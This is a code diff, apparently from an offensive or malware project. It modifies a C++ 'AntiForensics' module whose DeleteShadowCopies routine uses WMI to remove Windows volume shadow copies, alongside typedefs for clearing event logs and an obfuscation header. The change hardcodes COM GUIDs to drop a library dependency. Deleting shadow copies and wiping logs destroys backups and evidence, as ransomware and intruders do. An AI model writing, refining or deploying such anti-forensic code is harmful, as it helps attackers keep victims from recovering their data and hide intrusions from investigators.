@@ -3,6 +3,12 @@
 #include <wbemidl.h>
 #include "Obf.h"
 
+// Hardcoded GUIDs — removes wbemuuid.lib dependency
+static const CLSID kCLSID_WbemLocator =
+    {0x4590f811,0x1d3a,0x11d0,{0x89,0x1f,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
+static const IID kIID_IWbemLocator =
+    {0xdc12a687,0x737f,0x11cf,{0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24}};
+
 typedef BOOL      (WINAPI *fpEvtClearLog)       (EVT_HANDLE, LPCWSTR, LPCWSTR, DWORD);
 typedef EVT_HANDLE(WINAPI *fpEvtOpenChannelEnum)(EVT_HANDLE, DWORD);
 typedef BOOL      (WINAPI *fpEvtNextChannelPath)(EVT_HANDLE, DWORD, LPWSTR, PDWORD);
@@ -96,8 +102,8 @@ std::string AntiForensics::DeleteShadowCopies() {
     bool ownCom = SUCCEEDED(hr);
 
     IWbemLocator* pLoc = nullptr;
-    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
-                          IID_IWbemLocator, (void**)&pLoc);
+    hr = CoCreateInstance(kCLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
+                          kIID_IWbemLocator, (void**)&pLoc);
     if (FAILED(hr)) {
         if (ownCom) CoUninitialize();
         return "vss: CoCreateInstance(WbemLocator) failed";
